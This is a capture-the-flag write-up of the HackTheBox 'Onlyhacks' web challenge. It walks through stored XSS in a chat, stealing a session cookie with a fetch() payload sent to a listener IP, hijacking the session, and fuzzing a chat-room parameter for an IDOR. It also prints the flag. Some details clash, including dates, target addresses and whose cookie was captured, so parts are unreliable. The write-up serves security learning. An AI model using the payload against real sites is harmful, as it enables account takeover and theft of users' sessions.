---
title: "Onlyhacks @ HackTheBox"
date: 2026-07-14 09:00:00 +0200
categories: [Writeups, HackTheBox, Challenge]
tags: [XSS, IDOR, Session Hijacking, Cookie Theft, Web Security, Web Exploitation, Fuzzing, ffuf]
author: andrea
image:
  path: /commons/onlyhacks.jpeg
  no_bg: true
---

## Enumeration

We open the challenge and find ourselves facing a classic login page.

![alt text](/assets/img/posts/onlyhacks/image.png)

Nothing unusual in terms of standard enumeration: it’s a web app, so we’ll simply start by registering an account and logging in to see what lies behind the authentication.

## Inside the application

Once logged in, the app provides a user-matching system—essentially a dating app. We make a few random matches just to generate traffic and understand how it works, then head to the `Matches` section and notice that a user named `Renata` has sent us a message.

![alt text](assets/img/posts/onlyhacks/image-2.png)

The message field looks interesting; before diving in headfirst, let's try to figure out whether the input is sanitized server-side or not.

## XSS

Let's try a classic XSS payload directly in the chat, just to see how the backend reacts.
![alt text](assets/img/posts/onlyhacks/image-1.png)

The server doesn't filter anything at all: the payload renders without issues. The idea is simple: if we can get JavaScript to execute within another user's context, we can try to steal their session cookie and see what lies behind their account.

So, let's modify the payload to exfiltrate the cookie to a listener we control:

```html
<script>fetch('http://10.10.14.134/?cookies=' + document.cookie)</script>
```

The message is saved, and when the admin/victim opens the chat to read it, the script executes and sends us the cookie.
## Cookie Capture

We start listening using a simple Python HTTP server:

```bash
python3 -m http.server 80
```

And after a few moments, we receive the request containing the session cookie:
![alt text](/assets/img/posts/onlyhacks/image-3.png)

```
10.10.14.134 - - [02/Sep/2026 07:56:07] "GET /?cookies=session=eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6InRlc3QifX0.apgMJQ.C0O9SvM7Z_eayXYJCUNMLWIlapA HTTP/1.1" 200 -
```

## Session Hijacking

With the cookie in hand, the next step is trivial: we open the browser's DevTools, go to the `Cookies` section, and replace the value of our `session` cookie with the one we just captured. A page refresh, and we’re inside Renata’s session.
## IDOR in chats

Upon entering the chat section as Renata, the URL appears in this format:
```
http://154.57.164.82:31227/chat/?rid=3
```

The `rid` parameter appears to refer to the chat room ID, and nothing in the application logic seems to verify that the logged-in user actually has access to that room. Let's try brute-forcing the parameter using `ffuf` to see if there are other accessible rooms.

```bash
ffuf -w numbers.txt -u "http://154.57.164.78:30318/chat/?rid=FUZZ" \
  -rate 1 \
  -H "Cookie: session=eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6InRlc3QifX0.apgMJQ.C0O9SvM7Z_eayXYJCUNMLWIlapA" \
  -fs 199
```
The fuzzing results confirm the existence of (at least) one other accessible room:

```
3
```

## Flag

By setting `rid=3` in the chat URL, we find the flag directly in the conversation.

![alt text](/assets/img/posts/onlyhacks/image-4.png)

```
HTB{d0nt_trust_str4ng3r5_bl1ndly}
```

